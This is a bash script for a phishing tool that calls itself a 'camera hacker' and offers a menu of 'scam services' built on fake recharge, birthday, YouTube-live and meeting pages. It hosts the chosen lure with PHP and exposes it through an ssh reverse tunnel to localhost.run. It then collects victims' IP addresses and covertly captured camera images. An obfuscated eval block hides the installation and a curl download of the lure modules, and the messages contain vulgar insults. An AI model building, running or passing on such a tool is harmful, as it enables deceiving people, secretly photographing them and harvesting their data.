#!/usr/bin/env bash

cwd=`pwd`

# Net check 

ping -c 1 google.com >/dev/null 2>&1
if [ "$?" != '0' ]; then
  printf "Internet tera baap on karega madarchod!!\n"
  exit 1
fi 

# Requirements 
z="
";TBz='equi';Oz='ienk';UCz='rf m';ZBz='ome ';OBz='es" ';Bz='or=$';Zz='HOR=';Uz='if [';bBz='"';Sz='d -n';mz=' se ';hz='"\e[';az='Alie';Iz='.sh ';VBz='nts.';Nz='R=Al';QBz='tall';qz='mada';Mz='UTHO';nz='code';NCz='.tar';Cz='(cat';gz=' -e ';cBz='apt ';HCz='ar.g';qBz='ps:/';Lz='w "A';Dz=' ~/S';rz='rcho';Yz=' AUT';PCz='> /d';dz=']]; ';fz='echo';LCz=' mod';HBz='exit';sz='d\nD';jz='abhi';WBz='. ma';mBz='>&1';Rz=' hea';cz='shn ';xz=' cre';UBz='reme';BBz=' son';GCz='es.t';GBz='p 3';BCz='es/d';Az='auth';ICz='z';IBz='else';Fz='her/';Xz='r !=';TCz='rm -';bz='nkri';CCz='ownl';SBz='ll r';SCz='2>&1';Tz='1)';sBz='hub.';oz=' kar';iz='31mK';JCz='tar ';NBz='odul';ABz=' you';pBz=' htt';vBz='4You';YBz='ke s';CBz=' of ';Wz='utho';gBz='open';nBz='curl';kz=' to ';Gz='snat';DBz='a bi';RCz='ull ';wz=' the';tBz='com/';MCz='ules';oBz=' -LO';eBz='all ';KCz='-zxf';jBz=' /de';fBz='php ';DCz='oad/';pz=' le ';Qz='n" |';uBz='Anon';aBz='time';ECz='v1.0';lBz='ll 2';FBz='slee';Kz='ep -';tz='o no';MBz=' ".M';OCz='.gz ';PBz='"Ins';Pz='rish';Ez='natc';FCz='.0/m';hBz='ssh ';yz='dits';LBz='[ -d';iBz='-y >';wBz='/Sna';EBz='tch"';RBz='ig a';vz='nage';ez='then';lz='khud';Vz='[ $a';JBz=' ""';rBz='/git';QCz='ev/n';Hz='cher';uz='t ch';dBz='inst';yBz='r/re';Jz='| gr';XBz='y ta';ACz='leas';xBz='tche';KBz='fi';kBz='v/nu';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$FBz$GBz$z$HBz$z$IBz$z$fz$JBz$z$KBz$z$Uz$LBz$MBz$NBz$OBz$dz$ez$z$fz$JBz$z$IBz$z$fz$gz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$z$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$z$cBz$dBz$eBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$z$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$NBz$GCz$HCz$ICz$z$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$z$TCz$UCz$NBz$GCz$HCz$ICz$z$KBz"
main(){
  clear
  printf "
  >=>>=>                           >=>                                      
>=>    >=>                         >=>           >=>                        
 >=>       >==>>==>     >=> >=>  >=>>==>    >==> >=>        >==>    >> >==> 
   >=>      >=>  >=>  >=>   >=>    >=>    >=>    >=>>=>   >>   >=>   >=>    
      >=>   >=>  >=> >=>    >=>    >=>   >=>     >=>  >=> >>===>>=>  >=>    
>=>    >=>  >=>  >=>  >=>   >=>    >=>    >=>    >>   >=> >>         >=>    
  >=>>=>   >==>  >=>   >==>>>==>    >=>     >==> >=>  >=>  >====>   >==>" | lolcat
printf "

  \e[31;1m         .:.:.\e[0m\e[1;32m Snatcher camera hacker by ${AUTHOR} \e[0m\e[1;91m.:.:.\e[0m\n

       \e[101m\e[1;77m:: Author won't be resposible for any missuse of this tool ::\e[0m\n

    \e[36;1mAvailable scam services...\e[0;1m

     {1} Jio Recharge scam
     {2} Happy birthday scam
     {3} Youtube Live scam
     {4} Online meeting scam
     {5} Contact Author
     {0} Exit from tool

  "
  read -p "Choose a scam => " chs
  if [[ $chs == 0 ]]; then
    printf "\n\n\t\e[36mExitimg from tool....\e[0m\n"
    sleep 2
    exit
  elif [[ $chs == 1 ]]; then
    jio
  elif [[ $chs == 2 ]]; then
    fest
  elif [[ $chs == 3 ]]; then
    ytl
  elif [[ $chs == 4 ]]; then
    onmt
  elif [[ $chs == 5 ]]; then
    echo hello
  else
    printf "Invalid input try again madarchod..!"
    sleep 2
    main
  fi
}

jio(){
website="jio"
hosting
}

fest(){
website="fest"
hosting
}

ytl(){
website="live"
hosting
}

onmt(){
website="om"
hosting
}

hosting(){
  if [[ -d ".site" ]]; then
   rm -rf .site && mkdir .site
  else
    mkdir .site
  fi
  cp -rf .Modules/$website .site
  echo -e "\nif links are not shown relaunch the script $0\n"
  sleep 2
  printf "\e[32;1mStarting PHP server...\r"
  php -S localhost:8080 -t .site/$website > /dev/null 2>&1 &
  sleep 2
  #printf "Starting serveo.net...\r"
#  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
#  sleep 10
  printf "Starting localhost.run...\r"
  ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
  sleep 10
  #link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
  lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
  rm -rf .lhrlog .srvlog
  echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
#  echo Serveo.net : $link
  echo ""
  echo Localhost.run : $lhlink
  echo -e "\nLocalHost  : http://localhost:8080"
  target
}

target(){
echo -e "\n\e[31;1mWaiting for target info, press CTRL+C to stop\e[0m\n"
  while [[ true ]]; do
    if [[ -e ".site/$website/ip.txt" ]]; then
      echo -e "\e[32;1mVictim ip found!\e[0m"
      cat .site/$website/ip.txt
      rm -rf .site/$website/ip.txt
    fi 
    sleep 0.75
    if [[ -e ".site/$website/log.txt" ]]; then
      rm -rf .site/$website/log.txt
      echo -e "\n\e[32;1mImages snathed successfully..\e[0m"
      mv -v .site/$website/*.png Snatched > /dev/null 2>&1
      echo -e "images saved in ${cwd}/Snathched directory\n"
      echo -e "\n\e[31;1mWaiting for next target info press CTRL+C to exit\e[0m\n"
    fi 
    sleep 0.75
  done
}


usr_intrp(){
  printf "\e[0m\e[1;36m\t CTRL+C Pressed!, Exiting...\n"
  rm -rf .site
  sleep 2
  exit
}
AUTHOR=Alienkrishn
trap usr_intrp SIGINT
trap usr_intrp SIGTSTP
main
